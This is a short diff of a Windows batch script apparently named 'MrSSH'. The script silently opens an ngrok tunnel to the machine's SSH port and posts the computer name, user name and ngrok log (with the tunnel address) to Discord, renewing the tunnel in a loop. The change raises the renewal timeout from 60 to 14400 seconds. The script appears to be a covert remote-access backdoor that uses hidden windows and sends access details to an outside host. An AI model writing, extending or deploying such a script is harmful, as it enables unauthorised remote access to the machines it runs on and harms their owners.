@@ -40,10 +40,10 @@ call source.bat +silent --embed "MrSSH has been invoked on %computername%\%usern
 tar -xf ngrok.zip
 
 start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 & taskkill /IM ngrok.exe /F 
-start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 60
+start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
 
 :ngrokloop
 call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%local%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
 start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 & taskkill /IM ngrok.exe /F
-start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 60
+start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
 goto ngrokloop
